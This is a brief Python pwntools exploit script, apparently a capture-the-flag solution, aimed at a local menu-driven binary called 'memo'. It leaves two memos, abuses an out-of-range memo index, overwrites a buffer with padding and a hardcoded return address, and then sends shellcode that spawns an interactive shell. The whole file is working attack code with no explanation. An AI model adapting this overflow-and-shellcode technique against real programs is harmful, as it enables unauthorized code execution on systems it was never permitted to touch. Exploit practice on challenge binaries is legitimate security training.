#!/usr/bin/env python3
from pwn import *
context(arch='x86_64', os='linux')

LEAVE  = b'1'
EDIT   = b'2'
VIEW   = b'3'
DELETE = b'4'
CHANGE = b'5'
QUIT   = b'6'

BUFSIZE = 0x10
LOLMENU = 0x00400b47

def leave_memo(index, length, memo):
    r.sendline(LEAVE)
    r.recv()
    r.sendline(index)
    r.recv()
    r.sendline(length)
    r.recv()
    r.sendline(memo)
    r.recvline()

r = process('./memo')

r.recv().decode('utf-8')
r.sendline(b'bk')
r.recv().decode('utf-8')
r.sendline(b'n')
r.recvuntil('>> ')

leave_memo(b'0', b'10', b'lol')
r.recvuntil('>> ')
leave_memo(b'1', b'10', b'lol')
r.recvuntil('>> ')

r.sendline(LEAVE)
r.recv()
r.sendline(b'6')
r.recvuntil('>> ')

r.sendline(EDIT)
r.recv()
r.send(b'A'*(BUFSIZE + 8) + p64(LOLMENU))
r.recvline()
r.recvline()

r.send(asm(shellcraft.sh()))
r.interactive()
